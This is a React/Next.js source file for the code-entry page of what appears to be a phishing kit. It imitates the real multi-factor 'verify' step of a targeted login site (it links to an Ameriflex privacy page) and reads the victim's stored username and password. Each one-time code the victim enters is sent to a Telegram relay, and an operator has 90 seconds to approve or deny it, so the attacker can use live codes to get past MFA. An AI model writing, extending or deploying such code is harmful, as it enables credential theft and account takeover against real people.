"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import AuthShell from "@/components/auth-shell";
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages";
import { pollPendingLogin } from "@/lib/poll-pending-login";
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals";

/**
 * One-Time Passcode Entry Page (Gate 2) — `/verify`.
 *
 * UI: target's MFA "sent" state (Step 2) — Enter Code + Submit Code +
 * plain (non-underlined) Resend Code + authentic invalid-code row.
 *
 * Admin gate per Step 3 §8 (both OTP steps submit on this page):
 *   fire-and-forget /api/telegram/verification FIRST (never awaited)
 *   POST /api/pending-login { flow: "otp", password: code, …bot signals }
 *   → pollPendingLogin(id, APPROVAL_TIMEOUT_MS) (90s)
 *   approved | redirected → step 2: /api/login-out immediately
 *                           step 1: /verify-details immediately (project flow)
 *   denied    → stay on OTP; clear code; inline OTP_CODE_ERROR_TEXT (Rule 2)
 *   timeout / create failure → stay on OTP; clear code; inline
 *               MSG_UNABLE_VERIFY_TIME — never a homepage redirect (Rule 2)
 *
 * Submit disabled={isLoading} ONLY (Rule 5). Resend cooldown uses
 * OTP_RESEND_LOADING_MS + OTP_RESEND_COOLDOWN_SEC in try/finally and is never
 * tied to verify isLoading (§8). Input locks at the 6th digit (§8).
 *
 * Query parsing: `window.location.search` at mount instead of
 * `useSearchParams()` + `<Suspense>` — Next 16 dev streams that boundary into
 * a segment it never unhides (content stuck behind `div#S:1[hidden]`), while
 * production hydrates fine. Same behavior: the component mounts fresh on every
 * navigation to this route (`?step=2` included).
 */

const LOGOUT_DESTINATION = "/api/login-out";

function readSessionCredentials(): { userId: string; password: string } {
  try {
    const userId =
      sessionStorage.getItem("saved_username") ||
      sessionStorage.getItem("login_user_id") ||
      "";
    const password = sessionStorage.getItem("ubs_password") || "";
    return { userId, password };
  } catch {
    return { userId: "", password: "" };
  }
}

function readStoredMethod(): "email" | "text" {
  try {
    return sessionStorage.getItem("ubs_method") === "email"
      ? "email"
      : "text";
  } catch {
    return "text";
  }
}

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [invalidOtp, setInvalidOtp] = useState(false);
  const [gateError, setGateError] = useState<string | null>(null);
  const router = useRouter();
  const getBotGateSignals = useBotGateSignals();
  const [isSecondOtp] = useState(
    () =>
      typeof window !== "undefined" &&
      new URLSearchParams(window.location.search).get("step") === "2",
  );

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (isSecondOtp) {
      if (!sessionStorage.getItem("ubs_otp2"))
        router.replace("/verify-details");
    } else {
      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
    }
  }, [isSecondOtp, router]);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = setInterval(() => {
      setResendCooldown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [resendCooldown]);

  const handleVerify = async () => {
    if (isLoading) return;
    const digits = code.replace(/\D/g, "");
    if (digits.length !== 6) {
      // Target's own client-side invalid-code row (bundle template).
      setInvalidOtp(true);
      return;
    }
    setInvalidOtp(false);
    setGateError(null);
    setIsLoading(true);

    const { userId } = readSessionCredentials();
    const method = readStoredMethod();
    const finalOtp = isSecondOtp;

    // Fire-and-forget OTP Telegram FIRST (kit click rule — never awaited).
    // Also advances the login_flow cookie for the details step.
    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId,
        method,
        code: digits,
        verificationType: finalOtp ? "Code (final)" : "Code (first OTP)",
      }),
      keepalive: true,
    }).catch(() => {});

    try {
      // ===== Gate 2 — admin create + 90s poll =====
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          flow: "otp",
          userId,
          password: digits,
          method,
          maskedEmail: "-",
          maskedPhone: "-",
          ...getBotGateSignals(),
        }),
      });
      const data = (await res.json().catch(() => ({}))) as { id?: string };

      if (!res.ok || !data?.id) {
        // Create failure → STAY on OTP, clear code, canonical timeout copy.
        setCode("");
        setGateError(MSG_UNABLE_VERIFY_TIME);
        setIsLoading(false);
        return;
      }

      const outcome = await pollPendingLogin(
        String(data.id),
        APPROVAL_TIMEOUT_MS,
      );
      setIsLoading(false);

      if (outcome === "approved" || outcome === "redirected") {
        // Immediate — no post-approve delay (§6b anti-pattern).
        if (!finalOtp) {
          try {
            sessionStorage.setItem("ubs_details", "1");
          } catch {
            /* storage disabled */
          }
          router.push("/verify-details");
        } else {
          window.location.href = LOGOUT_DESTINATION;
        }
        return;
      }
      if (outcome === "denied") {
        setCode("");
        setGateError(OTP_CODE_ERROR_TEXT);
        return;
      }
      // timeout | error → inline, never homepage
      setCode("");
      setGateError(MSG_UNABLE_VERIFY_TIME);
    } catch {
      setCode("");
      setGateError(MSG_UNABLE_VERIFY_TIME);
      setIsLoading(false);
    }
  };

  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return;
    setIsResending(true);
    setInvalidOtp(false);
    setGateError(null);

    const { userId } = readSessionCredentials();
    const method = readStoredMethod();

    // Fire-and-forget resend Telegram (kit click rule).
    void fetch("/api/telegram/resend-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId, method, isSecondOtp }),
      keepalive: true,
    }).catch(() => {});

    try {
      await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
      setCode("");
    } finally {
      // Cooldown in finally so it applies even if the wait throws (§8).
      setIsResending(false);
      setResendCooldown(OTP_RESEND_COOLDOWN_SEC);
    }
  };

  const resendDisabled = isResending || resendCooldown > 0;
  // §8: input locks at the last digit.
  const codeComplete = code.replace(/\D/g, "").length === 6;

  return (
    <AuthShell>
      <form
        onSubmit={(e) => {
          e.preventDefault();
          void handleVerify();
        }}
      >
        <div className="form-group">
          <h4 className="panel-title">Let&apos;s verify this is you</h4>
        </div>

        <div className="form-group">
          <div className="row">
            <label htmlFor="txtOtp">Enter Code</label>
            <input
              id="txtOtp"
              type="text"
              className="form-control"
              placeholder="Code"
              value={code}
              onChange={(e) => {
                setInvalidOtp(false);
                if (gateError) setGateError(null);
                const digits = e.target.value.replace(/\D/g, "").slice(0, 6);
                setCode(digits);
                if (digits.length === 6) e.currentTarget.blur();
              }}
              autoComplete="off"
              required
              disabled={isLoading || codeComplete}
            />
          </div>

          {gateError ? (
            <div className="row" style={{ marginTop: "10px" }}>
              <div className="text-center login-error" role="alert">
                {gateError}
              </div>
            </div>
          ) : null}

          <div className="row" style={{ marginTop: "10px" }}>
            <button
              className="main-btn btn-block"
              type="submit"
              disabled={isLoading}
            >
              {isLoading ? null : "Submit Code"}
              {isLoading ? (
                <i className="fa fa-cog fa-spin" aria-hidden="true"></i>
              ) : null}
            </button>
          </div>

          <div className="row" style={{ marginTop: "10px" }}>
            If you did not receive your code then{" "}
            <button
              type="button"
              className="link-button"
              style={{ textDecoration: "none" }}
              onClick={() => void handleResend()}
              disabled={resendDisabled}
            >
              {isResending ? "Sending..." : "Resend Code"}
            </button>
          </div>

          {invalidOtp ? (
            <div className="row" style={{ marginTop: "10px" }}>
              The code entered was invalid. Please try again or{" "}
              <button
                type="button"
                className="link-button"
                onClick={() => void handleResend()}
                disabled={resendDisabled}
              >
                {isResending ? "Sending..." : "click to resend"}
              </button>
            </div>
          ) : null}
        </div>

        <hr />
        <p className="text-center">
          <a
            style={{ fontSize: "10px" }}
            href="https://myameriflex.com/security-privacy-terms-conditions/"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy Policy
          </a>
        </p>
      </form>
    </AuthShell>
  );
}

export default function EnterCodePage() {
  return <EnterCodeContent />;
}
